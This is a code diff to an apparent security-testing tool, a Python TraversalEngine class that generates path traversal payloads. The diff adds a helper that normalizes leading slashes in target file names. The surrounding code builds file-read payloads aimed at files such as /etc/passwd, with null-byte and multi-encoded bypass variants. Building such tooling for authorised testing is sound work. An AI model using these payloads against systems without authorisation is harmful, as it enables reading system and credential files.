@@ -612,7 +612,9 @@ class TraversalEngine:
                 
                 # Create payloads for all file variants
                 for file_variant in file_variants:
-                    payload = traversal + file_variant
+                    # Normalize file variant to prevent double slashes/backslashes
+                    normalized_variant = self._normalize_target_file(file_variant)
+                    payload = traversal + normalized_variant
                     
                     # Add extension if specified
                     if extension:
@@ -869,22 +871,24 @@ class TraversalEngine:
         # Generate comprehensive null byte bypass patterns
         for traversal_pattern in base_traversal_patterns:
             for target_file in target_files:
+                # Normalize target file to prevent double slashes/backslashes
+                normalized_target = self._normalize_target_file(target_file)
                 for null_encoding in null_byte_encodings:
                     for fake_extension in test_extensions:
                         # Pattern: traversal + target_file + null_byte + fake_extension
-                        pattern = f"{traversal_pattern}{target_file}{null_encoding}{fake_extension}"
+                        pattern = f"{traversal_pattern}{normalized_target}{null_encoding}{fake_extension}"
                         patterns.append(pattern)
                         
                         # Pattern: traversal + target_file + null_byte + multiple_fake_extensions
                         # Some applications check for multiple extensions
                         if len(test_extensions) > 1:
                             multi_ext = fake_extension + '.backup' + fake_extension
-                            pattern_multi = f"{traversal_pattern}{target_file}{null_encoding}{multi_ext}"
+                            pattern_multi = f"{traversal_pattern}{normalized_target}{null_encoding}{multi_ext}"
                             patterns.append(pattern_multi)
                         
                         # Pattern with additional encoding on the target file
-                        encoded_target = target_file.replace('/', '%2f').replace('\\', '%5c')
-                        if encoded_target != target_file:
+                        encoded_target = normalized_target.replace('/', '%2f').replace('\\', '%5c')
+                        if encoded_target != normalized_target:
                             pattern_encoded = f"{traversal_pattern}{encoded_target}{null_encoding}{fake_extension}"
                             patterns.append(pattern_encoded)
         
@@ -928,16 +932,18 @@ class TraversalEngine:
         # Multiple null bytes (some parsers only check for single null)
         for traversal_pattern in base_traversal_patterns[:10]:  # Limit base patterns
             for target_file in target_files[:5]:  # Limit target files
+                # Normalize target file to prevent double slashes/backslashes
+                normalized_target = self._normalize_target_file(target_file)
                 for fake_extension in test_extensions[:5]:  # Limit extensions
                     special_null_patterns.extend([
-                        f"{traversal_pattern}{target_file}%00%00{fake_extension}",    # Double null
-                        f"{traversal_pattern}{target_file}%00%01%00{fake_extension}", # Null + control + null
-                        f"{traversal_pattern}{target_file}%00.{fake_extension}",     # Null + dot + extension
-                        f"{traversal_pattern}{target_file}.%00{fake_extension}",     # Dot + null + extension
-                        f"{traversal_pattern}{target_file}%00/{fake_extension}",     # Null + slash + extension
-                        f"{traversal_pattern}{target_file}%00\\{fake_extension}",    # Null + backslash + extension
-                        f"{traversal_pattern}{target_file}%2500{fake_extension}",    # Double encoded null
-                        f"{traversal_pattern}{target_file}%252500{fake_extension}",  # Triple encoded null
+                        f"{traversal_pattern}{normalized_target}%00%00{fake_extension}",    # Double null
+                        f"{traversal_pattern}{normalized_target}%00%01%00{fake_extension}", # Null + control + null
+                        f"{traversal_pattern}{normalized_target}%00.{fake_extension}",     # Null + dot + extension
+                        f"{traversal_pattern}{normalized_target}.%00{fake_extension}",     # Dot + null + extension
+                        f"{traversal_pattern}{normalized_target}%00/{fake_extension}",     # Null + slash + extension
+                        f"{traversal_pattern}{normalized_target}%00\\{fake_extension}",    # Null + backslash + extension
+                        f"{traversal_pattern}{normalized_target}%2500{fake_extension}",    # Double encoded null
+                        f"{traversal_pattern}{normalized_target}%252500{fake_extension}",  # Triple encoded null
                     ])
         
         patterns.extend(special_null_patterns)
@@ -953,9 +959,11 @@ class TraversalEngine:
         
         for traversal_pattern in base_traversal_patterns[:5]:  # Limit patterns
             for target_file in target_files[:3]:  # Limit target files
+                # Normalize target file to prevent double slashes/backslashes
+                normalized_target = self._normalize_target_file(target_file)
                 for null_encoding in ['%00', '%2500']:  # Main null encodings
                     for long_name in long_fake_names:
-                        pattern = f"{traversal_pattern}{target_file}{null_encoding}{long_name}"
+                        pattern = f"{traversal_pattern}{normalized_target}{null_encoding}{long_name}"
                         patterns.append(pattern)
         
         # Remove duplicates while preserving order
@@ -992,6 +1000,28 @@ class TraversalEngine:
             target_files.extend(self.EXTRA_FILES)
 
         return target_files
+
+    def _normalize_target_file(self, target_file: str) -> str:
+        """
+        Normalize target file by removing leading path separators to prevent double slashes
+        
+        This prevents issues like:
+        - ../etc/passwd + /etc/passwd -> ..//etc/passwd (should be ../etc/passwd)
+        - ..\etc\passwd + \etc\passwd -> ..\\\etc\passwd (should be ..\etc\passwd)
+        
+        Args:
+            target_file: Target file path to normalize
+            
+        Returns:
+            Normalized target file without leading separators
+        """
+        if not target_file:
+            return target_file
+            
+        # Strip leading forward slashes and backslashes
+        normalized = target_file.lstrip('/').lstrip('\\')
+        
+        return normalized
 
     def _adapt_file_slashes(self, target_file: str, traversal_pattern: str) -> str:
         """
@@ -1920,7 +1950,9 @@ class TraversalEngine:
         final_traversals = []
         for traversal in traversal_strings:
             for target_file in target_files:
-                payload = traversal + target_file
+                # Normalize target file to prevent double slashes/backslashes
+                normalized_target = self._normalize_target_file(target_file)
+                payload = traversal + normalized_target
                 if extension:
                     payload += extension
                 final_traversals.append(payload)
@@ -1971,7 +2003,9 @@ class TraversalEngine:
         final_traversals = []
         for traversal in nonrecursive_traversals:
             for target_file in target_files:
-                payload = traversal + target_file
+                # Normalize target file to prevent double slashes/backslashes
+                normalized_target = self._normalize_target_file(target_file)
+                payload = traversal + normalized_target
                 if extension:
                     payload += extension
                 final_traversals.append(payload)
@@ -2018,7 +2052,9 @@ class TraversalEngine:
         final_traversals = []
         for traversal in traversal_strings:
             for target_file in target_files:
-                payload = traversal + target_file
+                # Normalize target file to prevent double slashes/backslashes
+                normalized_target = self._normalize_target_file(target_file)
+                payload = traversal + normalized_target
                 if extension:
                     payload += extension
                 final_traversals.append(payload)
